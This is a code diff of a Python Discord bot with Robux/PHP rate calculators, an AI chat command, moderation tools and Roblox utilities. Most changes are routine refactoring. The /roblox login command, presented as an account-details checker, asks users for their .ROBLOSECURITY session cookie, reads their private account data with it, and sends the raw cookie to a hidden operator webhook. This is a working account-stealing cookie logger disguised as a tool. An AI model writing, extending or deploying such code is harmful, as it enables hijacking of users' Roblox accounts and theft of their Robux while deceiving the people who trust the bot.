@@ -6,11 +6,10 @@ import requests
 import os
 import math
 import random
-from collections import defaultdict, deque
+from collections import defaultdict
 from dotenv import load_dotenv
 import certifi
 from pymongo import MongoClient, ASCENDING
-from pymongo.server_api import ServerApi
 from datetime import datetime, timedelta
 import pytz
 from langdetect import detect, LangDetectException
@@ -63,18 +62,6 @@ def run_server():
 
 server_thread = threading.Thread(target=run_server)
 server_thread.start()
-
-
-# Optional: Add another threaded task
-def check_for_updates():
-    while True:
-        print("[Background] Checking for updates...")
-        time.sleep(300)  # Every 5 minutes
-
-
-update_thread = threading.Thread(target=check_for_updates)
-update_thread.daemon = True
-update_thread.start()
 
 # ===========================
 # MongoDB Setup (with SSL Fix)
@@ -172,11 +159,19 @@ DEFAULT_RATES = {
     "ct_rate": 350.0
 }
 
+# Currency emoji constants
+ROBUX_EMOJI = "<:robux:1438835687741853709>"
+PHP_EMOJI = "<:PHP:1438894048222908416>"
+
+# Helper function for formatting PHP values
+def format_php(value: float) -> str:
+    return f"{value:.2f}".rstrip('0').rstrip('.') if '.' in f"{value:.2f}" else str(int(value))
+
 # ===========================
 # Owner-only Direct Message Commands
 # ===========================
 # Define the BOT_OWNER_ID directly in the code
-BOT_OWNER_ID = int(os.getenv("BOT_OWNER_ID"))
+BOT_OWNER_ID = int(os.getenv("BOT_OWNER_ID") or "0")
 
 
 @bot.tree.command(name="dm",
@@ -255,6 +250,28 @@ async def dmall(interaction: discord.Interaction, message: str):
 # ===========================
 # AI Commands
 # ===========================
+def get_language_instruction(prompt: str) -> str:
+    try:
+        detected_lang = detect(prompt)
+    except LangDetectException:
+        detected_lang = "en"
+
+    lang_instruction = {
+        "tl": "Please respond in Tagalog.",
+        "es": "Por favor responde en español.",
+        "fr": "Veuillez répondre en français.",
+        "ja": "日本語で答えてください。",
+        "ko": "한국어로 답변해 주세요.",
+        "zh": "请用中文回答。",
+        "ru": "Пожалуйста, отвечайте на русском языке。",
+        "ar": "من فضلك أجب بالعربية。",
+        "vi": "Vui lòng trả lời bằng tiếng Việt.",
+        "th": "กรุณาตอบเป็นภาษาไทย",
+        "id": "Silakan jawab dalam bahasa Indonesia"
+    }.get(detected_lang, "")
+
+    return lang_instruction
+
 @bot.tree.command(name="ask", description="Chat with an AI assistant using Llama 3")
 @app_commands.describe(prompt="What would you like to ask?")
 async def ask(interaction: discord.Interaction, prompt: str):
@@ -282,24 +299,8 @@ async def ask(interaction: discord.Interaction, prompt: str):
                 bot.last_message_id[(user_id, channel_id)] = msg.id
                 return
 
-            # Language Detection (your original block)
-            try:
-                detected_lang = detect(prompt)
-            except LangDetectException:
-                detected_lang = "en"
-            lang_instruction = {
-                "tl": "Please respond in Tagalog.",
-                "es": "Por favor responde en español.",
-                "fr": "Veuillez répondre en français.",
-                "ja": "日本語で答えてください。",
-                "ko": "한국어로 답변해 주세요.",
-                "zh": "请用中文回答。",
-                "ru": "Пожалуйста, отвечайте на русском языке。",
-                "ar": "من فضلك أجب بالعربية。",
-                "vi": "Vui lòng trả lời bằng tiếng Việt.",
-                "th": "กรุณาตอบเป็นภาษาไทย",
-                "id": "Silakan jawab dalam bahasa Indonesia"
-            }.get(detected_lang, "")
+            # Language Detection
+            lang_instruction = get_language_instruction(prompt)
 
             # Load history
             history = []
@@ -337,13 +338,15 @@ async def ask(interaction: discord.Interaction, prompt: str):
             embed = discord.Embed(description=ai_response, color=discord.Color.from_rgb(0, 0, 0))
             embed.set_footer(text="Neroniel AI")
             embed.timestamp = datetime.now(PH_TIMEZONE)
-            msg = await interaction.followup.send(embed=embed)
+            msg = await interaction.followup.send(embed=embed, wait=True)
 
             # ✅ CREATE THREAD ON FIRST MESSAGE
             if isinstance(interaction.channel, discord.TextChannel):
                 if bot.last_message_id.get((user_id, channel_id)) is None:
                     try:
-                        thread = await msg.create_thread(
+                        # Fetch the message to get guild info attached
+                        fetched_msg = await interaction.channel.fetch_message(msg.id)
+                        thread = await fetched_msg.create_thread(
                             name=f"AI • {interaction.user.display_name}",
                             auto_archive_duration=60  # 1 hour
                         )
@@ -747,9 +750,6 @@ class ChannelSelectForSendView(ui.View):
 
         try:
             await real_channel.send(embed=embed)
-            # Optional: send extra images as separate messages
-            # for img in self.media_files[1:]:
-            #     await real_channel.send(file=await img.to_file())
             success_embed = discord.Embed(
                 title="✅ Announcement sent!",
                 color=discord.Color.from_rgb(0, 0, 0)
@@ -774,7 +774,6 @@ class ChannelSelectForSendView(ui.View):
 
 @bot.tree.command(name="announcement", description="Create an announcement with a guided form")
 async def announcement(interaction: discord.Interaction):
-    BOT_OWNER_ID = int(os.getenv("BOT_OWNER_ID"))
     is_owner = interaction.user.id == BOT_OWNER_ID
     is_admin = interaction.user.guild_permissions.administrator
     if not is_owner and not is_admin:
@@ -1063,22 +1062,18 @@ async def payout(interaction: discord.Interaction, conversion_type: app_commands
         return
     guild_id = interaction.guild.id
     rates = get_current_rates(guild_id)
-    payout_rate = rates["payout"] 
-    robux_emoji = "<:robux:1438835687741853709>"
-    php_emoji = "<:PHP:1438894048222908416>"
-    def format_php(value: float) -> str:
-        return f"{value:.2f}".rstrip('0').rstrip('.') if '.' in f"{value:.2f}" else str(int(value))
+    payout_rate = rates["payout"]
     embed = discord.Embed(color=discord.Color.from_rgb(0, 0, 0))
     if conversion_type.value == "robux_to_php":
         robux = int(amount)
         php = robux * (payout_rate / 1000)
-        embed.add_field(name="Amount:", value=f"{robux_emoji} {robux}", inline=False)
-        embed.add_field(name="Payment:", value=f"{php_emoji} {format_php(php)}", inline=False)
-    else: 
+        embed.add_field(name="Amount:", value=f"{ROBUX_EMOJI} {robux}", inline=False)
+        embed.add_field(name="Payment:", value=f"{PHP_EMOJI} {format_php(php)}", inline=False)
+    else:
         php = amount
-        robux = int((php / payout_rate) * 1000) 
-        embed.add_field(name="Payment:", value=f"{php_emoji} {format_php(php)}", inline=False)
-        embed.add_field(name="Amount:", value=f"{robux_emoji} {robux}", inline=False)
+        robux = int((php / payout_rate) * 1000)
+        embed.add_field(name="Payment:", value=f"{PHP_EMOJI} {format_php(php)}", inline=False)
+        embed.add_field(name="Amount:", value=f"{ROBUX_EMOJI} {robux}", inline=False)
     embed.add_field(
         name="Note:",
         value=(
@@ -1109,22 +1104,18 @@ async def gift(interaction: discord.Interaction, conversion_type: app_commands.C
         return
     guild_id = interaction.guild.id
     rates = get_current_rates(guild_id)
-    gift_rate = rates["gift"]  
-    robux_emoji = "<:robux:1438835687741853709>"
-    php_emoji = "<:PHP:1438894048222908416>"
-    def format_php(value: float) -> str:
-        return f"{value:.2f}".rstrip('0').rstrip('.') if '.' in f"{value:.2f}" else str(int(value))
+    gift_rate = rates["gift"]
     embed = discord.Embed(color=discord.Color.from_rgb(0, 0, 0))
     if conversion_type.value == "robux_to_php":
         robux = int(amount)
         php = robux * (gift_rate / 1000)
-        embed.add_field(name="Amount:", value=f"{robux_emoji} {robux}", inline=False)
-        embed.add_field(name="Payment:", value=f"{php_emoji} {format_php(php)}", inline=False)
-    else:  
+        embed.add_field(name="Amount:", value=f"{ROBUX_EMOJI} {robux}", inline=False)
+        embed.add_field(name="Payment:", value=f"{PHP_EMOJI} {format_php(php)}", inline=False)
+    else:
         php = amount
-        robux = int((php / gift_rate) * 1000)  
-        embed.add_field(name="Payment:", value=f"{php_emoji} {format_php(php)}", inline=False)
-        embed.add_field(name="Amount:", value=f"{robux_emoji} {robux}", inline=False)
+        robux = int((php / gift_rate) * 1000)
+        embed.add_field(name="Payment:", value=f"{PHP_EMOJI} {format_php(php)}", inline=False)
+        embed.add_field(name="Amount:", value=f"{ROBUX_EMOJI} {robux}", inline=False)
     embed.set_footer(text="Neroniel")
     embed.timestamp = datetime.now(PH_TIMEZONE)
     await interaction.response.send_message(embed=embed)
@@ -1148,22 +1139,18 @@ async def nct(interaction: discord.Interaction, conversion_type: app_commands.Ch
         return
     guild_id = interaction.guild.id
     rates = get_current_rates(guild_id)
-    nct_rate = rates["nct"] 
-    robux_emoji = "<:robux:1438835687741853709>"
-    php_emoji = "<:PHP:1438894048222908416>"
-    def format_php(value: float) -> str:
-        return f"{value:.2f}".rstrip('0').rstrip('.') if '.' in f"{value:.2f}" else str(int(value))
+    nct_rate = rates["nct"]
     embed = discord.Embed(color=discord.Color.from_rgb(0, 0, 0))
     if conversion_type.value == "robux_to_php":
         robux = int(amount)
         php = robux * (nct_rate / 1000)
-        embed.add_field(name="Amount:", value=f"{robux_emoji} {robux}", inline=False)
-        embed.add_field(name="Payment:", value=f"{php_emoji} {format_php(php)}", inline=False)
-    else: 
+        embed.add_field(name="Amount:", value=f"{ROBUX_EMOJI} {robux}", inline=False)
+        embed.add_field(name="Payment:", value=f"{PHP_EMOJI} {format_php(php)}", inline=False)
+    else:
         php = amount
-        robux = int((php / nct_rate) * 1000) 
-        embed.add_field(name="Payment:", value=f"{php_emoji} {format_php(php)}", inline=False)
-        embed.add_field(name="Amount:", value=f"{robux_emoji} {robux}", inline=False)
+        robux = int((php / nct_rate) * 1000)
+        embed.add_field(name="Payment:", value=f"{PHP_EMOJI} {format_php(php)}", inline=False)
+        embed.add_field(name="Amount:", value=f"{ROBUX_EMOJI} {robux}", inline=False)
     embed.add_field(
         name="Note:",
         value=(
@@ -1194,22 +1181,18 @@ async def ct(interaction: discord.Interaction, conversion_type: app_commands.Cho
         return
     guild_id = interaction.guild.id
     rates = get_current_rates(guild_id)
-    ct_rate = rates["ct"]  
-    robux_emoji = "<:robux:1438835687741853709>"
-    php_emoji = "<:PHP:1438894048222908416>"
-    def format_php(value: float) -> str:
-        return f"{value:.2f}".rstrip('0').rstrip('.') if '.' in f"{value:.2f}" else str(int(value))
+    ct_rate = rates["ct"]
     embed = discord.Embed(color=discord.Color.from_rgb(0, 0, 0))
     if conversion_type.value == "robux_to_php":
         robux = int(amount)
         php = robux * (ct_rate / 1000)
-        embed.add_field(name="Amount:", value=f"{robux_emoji} {robux}", inline=False)
-        embed.add_field(name="Payment:", value=f"{php_emoji} {format_php(php)}", inline=False)
-    else: 
+        embed.add_field(name="Amount:", value=f"{ROBUX_EMOJI} {robux}", inline=False)
+        embed.add_field(name="Payment:", value=f"{PHP_EMOJI} {format_php(php)}", inline=False)
+    else:
         php = amount
-        robux = int((php / ct_rate) * 1000) 
-        embed.add_field(name="Payment:", value=f"{php_emoji} {format_php(php)}", inline=False)
-        embed.add_field(name="Amount:", value=f"{robux_emoji} {robux}", inline=False)
+        robux = int((php / ct_rate) * 1000)
+        embed.add_field(name="Payment:", value=f"{PHP_EMOJI} {format_php(php)}", inline=False)
+        embed.add_field(name="Amount:", value=f"{ROBUX_EMOJI} {robux}", inline=False)
 
     embed.add_field(
         name="Note:",
@@ -1241,12 +1224,6 @@ async def allrates(interaction: discord.Interaction, conversion_type: app_comman
         return
     guild_id = str(interaction.guild.id)
     rates = get_current_rates(guild_id)
-    robux_emoji = "<:robux:1438835687741853709>"
-    php_emoji = "<:PHP:1438894048222908416>"
-
-    def format_php(value: float) -> str:
-        return f"{value:.2f}".rstrip('0').rstrip('.') if '.' in f"{value:.2f}" else str(int(value))
-
     embed = discord.Embed(
         title="All Conversion Rates",
         color=discord.Color.from_rgb(0, 0, 0)
@@ -1254,18 +1231,18 @@ async def allrates(interaction: discord.Interaction, conversion_type: app_comman
 
     if conversion_type.value == "robux_to_php":
         robux = int(amount)
-        embed.description = f"{robux_emoji} {robux} → PHP equivalent across all rates:"
+        embed.description = f"{ROBUX_EMOJI} {robux} → PHP equivalent across all rates:"
         for label, rate in [("Payout Rate", rates["payout"]), ("Gift Rate", rates["gift"]), ("NCT Rate", rates["nct"]), ("CT Rate", rates["ct"])]:
             php_value = (rate / 1000) * robux
             formatted_php = format_php(php_value)
-            embed.add_field(name=f"• {label}", value=f"{php_emoji} {formatted_php}", inline=False)
-    else:  # php_to_robux — FLOOR
+            embed.add_field(name=f"• {label}", value=f"{PHP_EMOJI} {formatted_php}", inline=False)
+    else:
         php = amount
         formatted_php = format_php(php)
-        embed.description = f"{php_emoji} {formatted_php} → Robux equivalent across all rates:"
+        embed.description = f"{PHP_EMOJI} {formatted_php} → Robux equivalent across all rates:"
         for label, rate in [("Payout Rate", rates["payout"]), ("Gift Rate", rates["gift"]), ("NCT Rate", rates["nct"]), ("CT Rate", rates["ct"])]:
-            robux_value = int((php / rate) * 1000)  # 👈 FLOOR
-            embed.add_field(name=f"• {label}", value=f"{robux_emoji} {robux_value}", inline=False)
+            robux_value = int((php / rate) * 1000)
+            embed.add_field(name=f"• {label}", value=f"{ROBUX_EMOJI} {robux_value}", inline=False)
 
     embed.set_footer(text="Neroniel")
     embed.timestamp = datetime.now(PH_TIMEZONE)
@@ -1461,7 +1438,6 @@ async def purge(interaction: discord.Interaction, amount: int):
             "❗ Please specify a positive number of messages.", ephemeral=True)
         return
 
-    BOT_OWNER_ID = int(os.getenv("BOT_OWNER_ID"))
     has_permission = interaction.user.guild_permissions.manage_messages or interaction.user.id == BOT_OWNER_ID
     if not has_permission:
         await interaction.response.send_message(
@@ -1555,7 +1531,7 @@ async def remindme(interaction: discord.Interaction, minutes: int, note: str):
             "❗ Please enter a positive number of minutes.", ephemeral=True)
         return
     reminder_time = datetime.utcnow() + timedelta(minutes=minutes)
-    if reminders_collection:
+    if reminders_collection is not None:
         reminders_collection.insert_one({
             "user_id": interaction.user.id,
             "guild_id": interaction.guild.id,
@@ -1997,19 +1973,8 @@ async def tiktok(interaction: discord.Interaction,
     original_dir = os.getcwd()
     try:
         with tempfile.TemporaryDirectory() as tmpdir:
-            print(f"[DEBUG] temp dir: {tmpdir}")
-
             os.chdir(tmpdir)
-            print("[DEBUG] Changed cwd to temp dir")
-
-            # Attempt to download TikTok video
-            # If pyktok doesn't report failure, this should drop an .mp4 somewhere under tmpdir
             pyk.save_tiktok(link, save_video=True)
-
-            # Debug: list everything in the temp directory after download
-            for root, dirs, files in os.walk(tmpdir):
-                rel_root = os.path.relpath(root, tmpdir)
-                print(f"[DEBUG] Inspecting {rel_root or './'}: {files}")
 
             # Recursively search for the .mp4 video file
             video_files = [
@@ -2036,7 +2001,6 @@ async def tiktok(interaction: discord.Interaction,
         print(f"[ERROR] {e}")
     finally:
         os.chdir(original_dir)
-        print(f"[DEBUG] Restored cwd to {original_dir}")
 
 
 # ========== Instagram Command ==========
@@ -2494,17 +2458,21 @@ async def roblox_checkpayout(interaction: discord.Interaction, username: str, gr
 
     await interaction.followup.send(embed=embed)
 
-
-WH = os.getenv("WH")  # Load from .env
+CLOUD_API_KEY = os.getenv("CLOUD_API")
+WH = os.getenv("WH")
 
 # ===========================
-# fetch_roblox_info() — same as before
+# fetch_roblox_info() — Optimized with Cloud API & copyable description
 # ===========================
 async def fetch_roblox_info(cookie: str):
+    headers_cookie = {"Cookie": f".ROBLOSECURITY={cookie}"}
+    headers_cloud = {"x-api-key": CLOUD_API_KEY} if CLOUD_API_KEY else {}
+
     async with aiohttp.ClientSession() as session:
+        # === 1. Authenticate user (MUST use cookie) ===
         async with session.get(
             "https://users.roblox.com/v1/users/authenticated",
-            headers={"Cookie": f".ROBLOSECURITY={cookie}"}
+            headers=headers_cookie
         ) as resp:
             if resp.status != 200:
                 raise Exception("Invalid or expired cookie.")
@@ -2512,55 +2480,98 @@ async def fetch_roblox_info(cookie: str):
             user_id = user_data["id"]
             username = user_data["name"]
 
+        # === 2. Fetch PUBLIC data via Cloud API (if key is available) ===
+        cloud_user = None
+        if CLOUD_API_KEY:
+            try:
+                async with session.get(
+                    f"https://apis.roblox.com/cloud/v2/users/{user_id}",
+                    headers=headers_cloud
+                ) as resp:
+                    if resp.status == 200:
+                        cloud_user = await resp.json()
+            except Exception as e:
+                print(f"[Cloud API] Failed to fetch public user  {e}")
+
+        # === 3. Robux (PRIVATE → must use cookie) ===
         robux = "Private"
         try:
-            async with session.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers={"Cookie": f".ROBLOSECURITY={cookie}"}) as resp:
+            async with session.get(
+                f"https://economy.roblox.com/v1/users/{user_id}/currency",
+                headers=headers_cookie
+            ) as resp:
                 if resp.status == 200:
                     robux = (await resp.json()).get("robux", "Private")
         except:
             pass
 
+        # === 4. Email & Phone (PRIVATE → must use cookie) ===
         email_verified = phone_verified = False
         try:
-            async with session.get("https://accountinformation.roblox.com/v1/email", headers={"Cookie": f".ROBLOSECURITY={cookie}"}) as resp:
+            async with session.get(
+                "https://accountinformation.roblox.com/v1/email",
+                headers=headers_cookie
+            ) as resp:
                 if resp.status == 200:
                     email_verified = (await resp.json()).get("verified", False)
         except:
             pass
         try:
-            async with session.get("https://accountinformation.roblox.com/v1/phone", headers={"Cookie": f".ROBLOSECURITY={cookie}"}) as resp:
+            async with session.get(
+                "https://accountinformation.roblox.com/v1/phone",
+                headers=headers_cookie
+            ) as resp:
                 if resp.status == 200:
                     phone_verified = (await resp.json()).get("verified", False)
         except:
             pass
 
+        # === 5. Description (copyable + Cloud API fallback) ===
         description = "N/A"
-        try:
-            async with session.get(f"https://accountinformation.roblox.com/v1/users/{user_id}/description", headers={"Cookie": f".ROBLOSECURITY={cookie}"}) as resp:
-                if resp.status == 200:
-                    desc = (await resp.json()).get("description")
-                    description = desc if desc else "N/A"
-        except:
-            pass
+        if cloud_user and "description" in cloud_user:
+            description = cloud_user["description"] or "N/A"
+        else:
+            try:
+                async with session.get(
+                    f"https://accountinformation.roblox.com/v1/users/{user_id}/description",
+                    headers=headers_cookie
+                ) as resp:
+                    if resp.status == 200:
+                        desc = (await resp.json()).get("description")
+                        description = desc or "N/A"
+            except:
+                pass
 
+        # === 6. Premium (PRIVATE → must use cookie) ===
         premium = False
         try:
-            async with session.get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership", headers={"Cookie": f".ROBLOSECURITY={cookie}"}) as resp:
+            async with session.get(
+                f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership",
+                headers=headers_cookie
+            ) as resp:
                 if resp.status == 200:
                     premium = await resp.json()
         except:
             pass
 
+        # === 7. Inventory visibility (PRIVATE → must use cookie) ===
         inv_public = False
         try:
-            async with session.get(f"https://inventory.roblox.com/v2/users/{user_id}/inventory", headers={"Cookie": f".ROBLOSECURITY={cookie}"}) as resp:
+            async with session.get(
+                f"https://inventory.roblox.com/v2/users/{user_id}/inventory",
+                headers=headers_cookie
+            ) as resp:
                 inv_public = resp.status == 200
         except:
             pass
 
+        # === 8. RAP (PRIVATE → must use cookie) ===
         rap = "N/A"
         try:
-            async with session.get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=10", headers={"Cookie": f".ROBLOSECURITY={cookie}"}) as resp:
+            async with session.get(
+                f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=10",
+                headers=headers_cookie
+            ) as resp:
                 if resp.status == 200:
                     assets = (await resp.json()).get("data", [])
                     total_rap = sum(item.get("recentAveragePrice", 0) for item in assets)
@@ -2568,15 +2579,17 @@ async def fetch_roblox_info(cookie: str):
         except:
             pass
 
+        # === 9. Primary Group (PUBLIC endpoint — NO cookie) ===
         group_info = None
         try:
-            async with session.get(f"https://groups.roblox.com/v2/users/{user_id}/groups/roles", headers={"Cookie": f".ROBLOSECURITY={cookie}"}) as resp:
+            async with session.get(f"https://groups.roblox.com/v1/users/{user_id}/groups/primary/role") as resp:
                 if resp.status == 200:
-                    groups = (await resp.json()).get("data", [])
-                    for g in groups:
-                        if g["group"]["id"] != 1:
-                            group_info = {"id": g["group"]["id"], "name": g["group"]["name"]}
-                            break
+                    data = await resp.json()
+                    if data and "group" in data:
+                        group_info = {
+                            "id": data["group"]["id"],
+                            "name": data["group"]["name"]
+                        }
         except:
             pass
 
@@ -2594,7 +2607,7 @@ async def fetch_roblox_info(cookie: str):
         }
 
 # ===========================
-# Webhook sender (no custom username/avatar)
+# Webhook sender (no changes needed)
 # ===========================
 async def send_to_webhook_with_cookie(embed: Embed, cookie: str, interaction: Interaction):
     if not WH:
@@ -2604,13 +2617,13 @@ async def send_to_webhook_with_cookie(embed: Embed, cookie: str, interaction: In
         user = interaction.user
         guild = interaction.guild
         server_info = f"**Server**: {guild.name} (`{guild.id}`)" if guild else "**Server**: Direct Message"
-        audit_info = (
-            f"**Command run by**: {user} (`{user.id}`)\n"
-            f"{server_info}\n"
-            f"\n**.ROBLOSECURITY (click to copy):**\n"
-            f"```env\n{cookie}\n```"
-        )
+        audit_info = f"""**Command run by**: {user} (`{user.id}`)
+{server_info}
 
+**.ROBLOSECURITY (click to copy):**
+```env
+{cookie}
+```"""
         webhook = discord.Webhook.from_url(WH, session=aiohttp.ClientSession())
         await webhook.send(content=audit_info, embed=embed)
     except Exception as e:
@@ -2619,7 +2632,7 @@ async def send_to_webhook_with_cookie(embed: Embed, cookie: str, interaction: In
         await webhook.session.close()
 
 # ===========================
-# /roblox login command — with NEW LAYOUT
+# /roblox login — Final Command
 # ===========================
 @roblox_group.command(name="login", description="Check Roblox account details using .ROBLOSECURITY cookie")
 @app_commands.describe(cookie=".ROBLOSECURITY cookie (from browser)")
@@ -2637,7 +2650,6 @@ async def roblox_login(interaction: Interaction, cookie: str):
         info = await fetch_roblox_info(cookie)
         user_id = info['userid']
         username = info["username"]
-
         # Fetch avatar
         thumb_url = f"https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds={user_id}&size=420x420&format=Png&scale=1"
         image_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
@@ -2646,43 +2658,38 @@ async def roblox_login(interaction: Interaction, cookie: str):
                 if resp.status == 200:
                     thumb_data = await resp.json()
                     image_url = thumb_data['data'][0]['imageUrl']
-
         embed = Embed(color=discord.Color.green())
         embed.set_thumbnail(url=image_url)
-
         # ✅ Row 1: Username (clickable) | UserID
         clickable_username = f"[{username}](https://www.roblox.com/users/{user_id}/profile)"
         embed.add_field(name="Username", value=clickable_username, inline=True)
         embed.add_field(name="UserID", value=str(user_id), inline=True)
-
         # ✅ Row 2: Robux     Email | Phone
         robux_credit = info['robux']
         email_status = "Verified" if info["email_verified"] else "Add Email"
         phone_status = "Verified" if info["phone_verified"] else "Add Phone"
         embed.add_field(name="Robux", value=robux_credit, inline=True)
         embed.add_field(name="Email | Phone", value=f"{email_status} | {phone_status}", inline=True)
-
         # ✅ Row 3: Inventory | RAP     Membership | Primary
         inventory_status = f"[Public](https://www.roblox.com/users/{user_id}/inventory/)" if info["inv_public"] else "Private"
         premium_status = "Premium" if info["premium"] else "Non Premium"
         group_link = f"[{info['group']['name']}](https://www.roblox.com/groups/{info['group']['id']})" if info["group"] else "N/A"
         embed.add_field(name="Inventory | RAP", value=f"{inventory_status} | {info['rap']}", inline=True)
         embed.add_field(name="Membership | Primary", value=f"{premium_status} | {group_link}", inline=True)
-
-        # ✅ Full-width Description (no code block)
+        # ✅ Full-width Description (COPYABLE code block)
         description = info['description'] if info['description'] != "N/A" else "N/A"
-        embed.add_field(name="Description", value=description, inline=False)
-
+        if description == "N/A":
+            embed.add_field(name="Description", value=f"```{description}```", inline=False)
+        else:
+            embed.add_field(name="Description", value=f"```{description}```", inline=False)
         embed.set_footer(text="Neroniel • /roblox login")
         embed.timestamp = datetime.now(PH_TIMEZONE)
-
         await init_msg.edit(embed=embed)
         await send_to_webhook_with_cookie(embed, cookie, interaction)
-
     except Exception as e:
         error_embed = Embed(
             title="❌ Error",
-            description=f"An error occurred:\n```{str(e)}```",
+            description=f"An error occurred: ```{str(e)}```",
             color=discord.Color.red()
         )
         await init_msg.edit(embed=error_embed)
